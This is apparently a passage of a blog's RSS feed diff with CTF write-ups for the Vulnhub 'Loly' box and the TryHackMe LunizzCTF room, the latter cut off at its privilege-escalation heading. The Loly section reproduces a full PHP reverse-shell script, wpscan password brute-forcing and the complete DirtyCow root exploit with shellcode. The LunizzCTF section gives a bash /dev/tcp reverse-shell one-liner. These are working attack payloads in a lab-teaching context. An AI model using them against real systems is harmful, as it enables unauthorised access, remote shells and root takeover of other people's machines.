+        <guid isPermaLink="true">/writeup-tryhackme-sustah/</guid>
+        
+        <category>medium-box</category>
+        
+        <category>boot2root</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>cve</category>
+        
+        
+        <category>Tryhackme</category>
+        
+      </item>
+    
+      <item>
+        <title>Loly Writeup</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+
+&lt;p&gt;This is partical room from tryhackme entitled “Loly” form vulnhub. Difficulty of This box is easy and in this box you will learn all about exploiting Wordpress , Bruteforce login, Custom exploitation For privilage escalation. Okay no let’s Pwn this box :p.&lt;/p&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;p&gt;First think we gonna do now is scanning the machines using nmap :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap 192.168.144.121 -sC -sV                                           255 ⨯
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-02 19:51 WIB
+Nmap scan report for 192.168.144.121
+Host is up (0.26s latency).
+Not shown: 998 closed ports
+PORT    STATE    SERVICE      VERSION
+80/tcp  open     http         nginx 1.10.3 (Ubuntu)
+|_http-server-header: nginx/1.10.3 (Ubuntu)
+|_http-title: Welcome to nginx!
+783/tcp filtered spamassassin
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 27.40 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;As you can see the port open just http nginx which is it’s just default pages of nginx. In this case i’m trying to bruteforce or fuzzing directory and i found &lt;code&gt;/wordpress&lt;/code&gt; :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After looking around i found page and it’s an error when opened. Then im try to put domain &lt;code&gt;loly.lc&lt;/code&gt;to hosts :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;$ cat /etc/hosts               
+127.0.0.1       localhost
+127.0.1.1       Razor
+
+# CTF
+
+192.168.144.121 loly.lc
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now let’s reopen browser and going to this url &lt;code&gt;http://loly.lc/wordpress&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h2&gt;
+
+&lt;h3 id=&quot;wpscan&quot;&gt;Wpscan&lt;/h3&gt;
+&lt;p&gt;We are now the website using wordpress. In this case i want to using tools namely &lt;code&gt;WPScan&lt;/code&gt; to enumeration website.&lt;code&gt;wpscan --url http://loly.lc/wordpress --enumerate u&lt;/code&gt; .&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bat&quot;&gt;_______________________________________________________________
+
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.15
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o, default: [N]N
+[+] URL: http://loly.lc/wordpress/ [192.168.144.121]
+[+] Started: Tue Mar  2 20:13:22 2021
+
+Interesting Finding(s):
+                                                                                 
+[+] Headers                                                                      
+ | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)                              
+ | Found By: Headers (Passive Detection)                                         
+ | Confidence: 100%
+
+[+] XML-RPC seems to be enabled: http://loly.lc/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] WordPress readme found: http://loly.lc/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] The external WP-Cron seems to be enabled: http://loly.lc/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://loly.lc/wordpress/?feed=comments-rss2, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.5&amp;lt;/generator&amp;gt;
+ | Confirmed By: Emoji Settings (Passive Detection)
+ |  - http://loly.lc/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5'
+
+[+] WordPress theme in use: feminine-style
+ | Location: http://loly.lc/wordpress/wp-content/themes/feminine-style/
+ | Last Updated: 2019-10-17T00:00:00.000Z
+ | Readme: http://loly.lc/wordpress/wp-content/themes/feminine-style/readme.txt
+ | [!] The version is out of date, the latest version is 2.0.0
+ | Style URL: http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5
+ | Style Name: Feminine Style
+ | Style URI: https://www.acmethemes.com/themes/feminine-style
+ | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo...
+ | Author: acmethemes
+ | Author URI: https://www.acmethemes.com/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.0.0 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5, Match: 'Version: 1.0.0'
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 &amp;lt;======================&amp;gt; (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] loly
+ | Found By: Author Posts - Display Name (Passive Detection)
+ | Confirmed By:
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] A WordPress Commenter
+ | Found By: Rss Generator (Passive Detection)
+
+[!] No WPScan API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
+
+[+] Finished: Tue Mar  2 20:13:38 2021
+[+] Requests Done: 54
+[+] Cached Requests: 7
+[+] Data Sent: 14.804 KB
+[+] Data Received: 421.805 KB
+[+] Memory used: 155.531 MB
+[+] Elapsed time: 00:00:15
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can see we found user namely &lt;code&gt;loly&lt;/code&gt;. So we can bruteforce the user to login wordpress. In this case i’m still using wpscan to bruteforce password . You also using hydra to bruteforce. wpscan : &lt;code&gt;$ wpscan --url http://loly.lc/wordpress -U loly -P /home/razor/Documents/Wordlist/SecLists/Passwords/darkweb2017-top1000.txt&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Now we got the password from lofi, let’s login wordpress and search plugin for exploit. After looking around i found plugin which contain upload file. 
+&lt;img src=&quot;/assets/vulnhub_loly/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then i found where we execute the file.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;exploit&quot;&gt;Exploit&lt;/h2&gt;
+
+&lt;p&gt;Now let’s create php revershell and compress to zip &lt;code&gt;zip shell.zip shell.php&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
+
+set_time_limit (0);
+$VERSION = &quot;1.0&quot;;
+$ip = '192.168.49.144';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+	// Fork and have the parent process exit
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit(&quot;ERROR: Can't fork&quot;);
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+
+	// Make the current process a session leader
+	// Will only succeed if we forked
+	if (posix_setsid() == -1) {
+		printit(&quot;Error: Can't setsid()&quot;);
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);
+}
+
+// Change to a safe directory
+chdir(&quot;/&quot;);
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit(&quot;$errstr ($errno)&quot;);
+	exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 =&amp;gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from
+   1 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to
+   2 =&amp;gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit(&quot;ERROR: Can't spawn shell&quot;);
+	exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit(&quot;Successfully opened reverse shell to $ip:$port&quot;);
+
+while (1) {
+	// Check for end of TCP connection
+	if (feof($sock)) {
+		printit(&quot;ERROR: Shell connection terminated&quot;);
+		break;
+	}
+
+	// Check for end of STDOUT
+	if (feof($pipes[1])) {
+		printit(&quot;ERROR: Shell process terminated&quot;);
+		break;
+	}
+
+	// Wait until a command is end down $sock, or some
+	// command output is available on STDOUT or STDERR
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	// If we can read from the TCP socket, send
+	// data to process's STDIN
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit(&quot;SOCK READ&quot;);
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit(&quot;SOCK: $input&quot;);
+		fwrite($pipes[0], $input);
+	}
+
+	// If we can read from the process's STDOUT
+	// send data down tcp connection
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit(&quot;STDOUT READ&quot;);
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit(&quot;STDOUT: $input&quot;);
+		fwrite($sock, $input);
+	}
+
+	// If we can read from the process's STDERR
+	// send data down tcp connection
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit(&quot;STDERR READ&quot;);
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit(&quot;STDERR: $input&quot;);
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+	if (!$daemon) {
+		print &quot;$string\n&quot;;
+	}
+}
+
+?&amp;gt; 
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&quot;getting-shell&quot;&gt;Getting Shell&lt;/h3&gt;
+
+&lt;p&gt;Then upload it , then before execute it we must create netcate for listener &lt;code&gt;nc -lvnp 1234&lt;/code&gt; .
+&lt;img src=&quot;/assets/vulnhub_loly/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;So we are connected to shell now. In this one i’m using tools namely &lt;code&gt;linux-exploit-suggester.sh&lt;/code&gt; And there is the result.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalation&quot;&gt;Privilage Escalation&lt;/h2&gt;
+
+&lt;p&gt;As you can see there is a lot suggest of vuln privilage. In this case i want to using dirtcow to getting privilage of root. &lt;a href=&quot;https://gist.github.com/rverton/e9d4ff65d703a9084e85fa9df083c679&quot;&gt;here&lt;/a&gt; The code to exploit and getting root.&lt;/p&gt;
+
+&lt;p&gt;cowroot.c :&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-c&quot;&gt;/*
+* (un)comment correct payload first (x86 or x64)!
+* 
+* $ gcc cowroot.c -o cowroot -pthread
+* $ ./cowroot
+* DirtyCow root privilege escalation
+* Backing up /usr/bin/passwd.. to /tmp/bak
+* Size of binary: 57048
+* Racing, this may take a while..
+* /usr/bin/passwd overwritten
+* Popping root shell.
+* Don't forget to restore /tmp/bak
+* thread stopped
+* thread stopped
+* root@box:/root/cow# id
+* uid=0(root) gid=1000(foo) groups=1000(foo)
+*
+* @robinverton 
+*/
+
+#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;pthread.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+
+void *map;
+int f;
+int stop = 0;
+struct stat st;
+char *name;
+pthread_t pth1,pth2,pth3;
+
+// change if no permissions to read
+char suid_binary[] = &quot;/usr/bin/passwd&quot;;
+
+/*
+* $ msfvenom -p linux/x64/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+*/ 
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0xb1, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xea, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x48, 0x31, 0xff, 0x6a, 0x69, 0x58, 0x0f, 0x05, 0x6a, 0x3b, 0x58, 0x99,
+  0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48,
+  0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8,
+  0x0a, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73,
+  0x68, 0x00, 0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05
+};
+unsigned int sc_len = 177;
+
+/*
+* $ msfvenom -p linux/x86/exec CMD=/bin/bash PrependSetuid=True -f elf | xxd -i
+unsigned char sc[] = {
+  0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
+  0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+  0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x88, 0x00, 0x00, 0x00,
+  0xbc, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
+  0x31, 0xdb, 0x6a, 0x17, 0x58, 0xcd, 0x80, 0x6a, 0x0b, 0x58, 0x99, 0x52,
+  0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68, 0x2f, 0x73, 0x68, 0x00, 0x68,
+  0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52, 0xe8, 0x0a, 0x00, 0x00, 0x00,
+  0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x00, 0x57, 0x53,
+  0x89, 0xe1, 0xcd, 0x80
+};
+unsigned int sc_len = 136;
+*/
+
+void *madviseThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int i,c=0;
+    for(i=0;i&amp;lt;1000000 &amp;amp;&amp;amp; !stop;i++) {
+        c+=madvise(map,100,MADV_DONTNEED);
+    }
+    printf(&quot;thread stopped\n&quot;);
+}
+
+void *procselfmemThread(void *arg)
+{
+    char *str;
+    str=(char*)arg;
+    int f=open(&quot;/proc/self/mem&quot;,O_RDWR);
+    int i,c=0;
+    for(i=0;i&amp;lt;1000000 &amp;amp;&amp;amp; !stop;i++) {
+        lseek(f,map,SEEK_SET);
+        c+=write(f, str, sc_len);
+    }
+    printf(&quot;thread stopped\n&quot;);
+}
+
+void *waitForWrite(void *arg) {
+    char buf[sc_len];
+
+    for(;;) {
+        FILE *fp = fopen(suid_binary, &quot;rb&quot;);
+
+        fread(buf, sc_len, 1, fp);
+
+        if(memcmp(buf, sc, sc_len) == 0) {
+            printf(&quot;%s overwritten\n&quot;, suid_binary);
+            break;
+        }
+
+        fclose(fp);
+        sleep(1);
+    }
+
+    stop = 1;
+
+    printf(&quot;Popping root shell.\n&quot;);
+    printf(&quot;Don't forget to restore /tmp/bak\n&quot;);
+
+    system(suid_binary);
+}
+
+int main(int argc,char *argv[]) {
+    char *backup;
+
+    printf(&quot;DirtyCow root privilege escalation\n&quot;);
+    printf(&quot;Backing up %s to /tmp/bak\n&quot;, suid_binary);
+
+    asprintf(&amp;amp;backup, &quot;cp %s /tmp/bak&quot;, suid_binary);
+    system(backup);
+
+    f = open(suid_binary,O_RDONLY);
+    fstat(f,&amp;amp;st);
+
+    printf(&quot;Size of binary: %d\n&quot;, st.st_size);
+
+    char payload[st.st_size];
+    memset(payload, 0x90, st.st_size);
+    memcpy(payload, sc, sc_len+1);
+
+    map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
+
+    printf(&quot;Racing, this may take a while..\n&quot;);
+
+    pthread_create(&amp;amp;pth1, NULL, &amp;amp;madviseThread, suid_binary);
+    pthread_create(&amp;amp;pth2, NULL, &amp;amp;procselfmemThread, payload);
+    pthread_create(&amp;amp;pth3, NULL, &amp;amp;waitForWrite, NULL);
+
+    pthread_join(pth3, NULL);
+
+    return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now we just compile this code and run in the target .
+&lt;img src=&quot;/assets/vulnhub_loly/bg_8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Just igrone the warning and run this.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/vulnhub_loly/bg_9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Boom!! we are root now, this so easy for people script kiddie like me :D, And thats it my writeup of Loly from vulnhub i hope you enjoy&lt;/p&gt;
+
+&lt;p&gt;Happy hacking :D.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 02 Mar 2021 00:00:00 -0600</pubDate>
+        <link>/writeup-vulnhub-loly/</link>
+        <guid isPermaLink="true">/writeup-vulnhub-loly/</guid>
+        
+        <category>easy-box</category>
+        
+        <category>boot2root</category>
+        
+        <category>privilage escalation</category>
+        
+        <category>web exploitation</category>
+        
+        <category>cve</category>
+        
+        
+        <category>Vulnhub</category>
+        
+        <category>Linux</category>
+        
+      </item>
+    
+      <item>
+        <title>Tryhackme LunizzCTF (CVE SUDOERS)</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;This is partical room from tryhackme entitled &lt;code&gt;LunizzCTF&lt;/code&gt; with Medium difficulty, but In this Case i want to implement cve sudoers (CVE-2021-3156). In this room we will learn about boot2root, Web Exploitation and Privilage escalation with CVE. room link &lt;a href=&quot;https://tryhackme.com/room/lunizzctfnd&quot;&gt;here&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;I just tried poc from sudo and I do not recommend you to use this method :D&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;scanning&quot;&gt;Scanning&lt;/h2&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+
+&lt;p&gt;First let’s scanning this box with nmap :&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ nmap 10.10.106.87 -sC -sV 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-01 18:54 WIB
+Nmap scan report for 10.10.106.87
+Host is up (0.37s latency).
+Not shown: 995 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 f8:08:db:be:ed:80:d1:ef:a4:b0:a9:e8:2d:e2:dc:ee (RSA)
+|   256 79:01:d6:df:8b:0a:6e:ad:b7:d8:59:9a:94:0a:09:7a (ECDSA)
+|_  256 b1:a9:ef:bb:7e:5b:01:cd:4c:8e:6b:bf:56:5d:a7:f4 (ED25519)
+80/tcp   open  http       Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3306/tcp open  mysql      MySQL 5.7.32-0ubuntu0.18.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.32-0ubuntu0.18.04.1
+|   Thread ID: 5
+|   Capabilities flags: 65535
+|   Some Capabilities: Support41Auth, SupportsLoadDataLocal, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, FoundRows, LongColumnFlag, ODBCClient, InteractiveClient, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, SupportsCompression, Speaks41ProtocolOld, LongPassword, ConnectWithDatabase, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: EiV\x0F#\x023-J\x02\x13m\x07M\x7F\x12\x10\x13GW
+|_  Auth Plugin Name: mysql_native_password
+| ssl-cert: Subject: commonName=MySQL_Server_5.7.32_Auto_Generated_Server_Certificate
+| Not valid before: 2020-12-10T19:29:01
+|_Not valid after:  2030-12-08T19:29:01
+|_ssl-date: TLS randomness does not represent time
+4444/tcp open  tcpwrapped
+5000/tcp open  tcpwrapped
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 43.76 seconds
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that, nmap show us the port open. As you can see the box have 5 port, i want to check directory with gobuster at webserver. and there is the result :&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;$ gobuster dir -u 10.10.65.37 -w /usr/share/dirb/wordlists/big.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.65.37
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2021/03/01 21:56:18 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/whatever (Status: 301)
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I found directory &lt;code&gt;/whatever&lt;/code&gt; there is the page :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_1.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;And we can’t put any command in here. After i’m scanning again with extension txt and php i found &lt;code&gt;instruction.txt&lt;/code&gt; and contain credentials user mysql:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$ gobuster dir -u 10.10.65.37 -w /usr/share/dirb/wordlists/big.txt -x php,txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.65.37
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,txt
+[+] Timeout:        10s
+===============================================================
+2021/03/01 21:56:59 Starting gobuster
+===============================================================
+/.htpasswd (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/hidden (Status: 301)
+/index.php (Status: 200)
+/instructions.txt (Status: 200)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;getting-credentials&quot;&gt;Getting Credentials&lt;/h2&gt;
+
+&lt;h3 id=&quot;login-mysql&quot;&gt;Login mysql&lt;/h3&gt;
+&lt;p&gt;Now let’s login mysql with credentials in &lt;code&gt;instructions.txt&lt;/code&gt; and looking for something interesting.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;then i found this :&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;it’s must be value of &lt;code&gt;/whatever&lt;/code&gt; to command execute we must change the ‘0’ to ‘1’.&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;update runcheck set runornot = 1;&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Then let’s check command in &lt;code&gt;/whatever&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;getting-shell-web&quot;&gt;Getting Shell web&lt;/h3&gt;
+
+&lt;p&gt;Its work now. Let’s put revershell to getting &lt;code&gt;www-data&lt;/code&gt;, you can use &lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ATTACKER-IP&amp;gt;/&amp;lt;PORT&amp;gt; 0&amp;gt;&amp;amp;1&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/thm_lunizzctf/bg_7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We got revershell now&lt;/p&gt;
+
+&lt;h2 id=&quot;privilage-escalations&quot;&gt;Privilage Escalations&lt;/h2&gt;
+
